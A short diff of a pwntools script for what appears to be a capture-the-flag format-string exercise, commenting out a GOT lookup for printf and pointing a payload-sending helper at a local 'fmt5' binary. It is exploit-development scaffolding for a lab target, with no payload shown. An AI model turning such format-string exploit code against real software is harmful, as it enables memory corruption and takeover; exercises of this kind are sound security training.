@@ -5,12 +5,12 @@ from pwn import *
 context(arch='i386',os='linux')
 context.terminal=["tmux","splitw","-h"]
 
-elf =ELF("./easyFMT")
-printf_got=elf.got['printf']
-log,info("printf_got: {0}".format(hex(printf_got)))
+# elf =ELF("./easyFMT")
+# printf_got=elf.got['printf']
+# log,info("printf_got: {0}".format(hex(printf_got)))
 
 def exec_fmt(payload):
-    r=process('./easyFMT')
+    r=process('./pwn/string/fmt-5/fmt5')
     r.recvuntil('\n',drop=True)
     r.sendline(payload)
     return r.recv()
